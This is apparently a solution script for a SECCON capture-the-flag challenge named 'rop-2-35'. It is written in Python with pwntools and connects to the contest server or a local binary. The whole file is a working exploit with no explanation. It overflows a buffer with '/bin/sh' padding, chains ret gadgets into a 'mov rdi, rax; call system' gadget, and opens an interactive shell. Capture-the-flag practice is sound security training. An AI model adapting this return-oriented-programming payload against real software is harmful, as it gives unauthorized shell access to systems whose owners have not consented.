#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc rop-2-35.seccon.games 9999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

gets = 0x401060
ret = 0x401110
mov_rdi_rax_call_system = 0x401169

payload = b'/bin/sh\x00'.ljust(0x18, b"\x00")
payload += p64(ret)
payload += p64(ret)
payload += p64(ret)
payload += p64(ret)
payload += p64(mov_rdi_rax_call_system)
pause()
io.sendline(payload)

io.interactive()
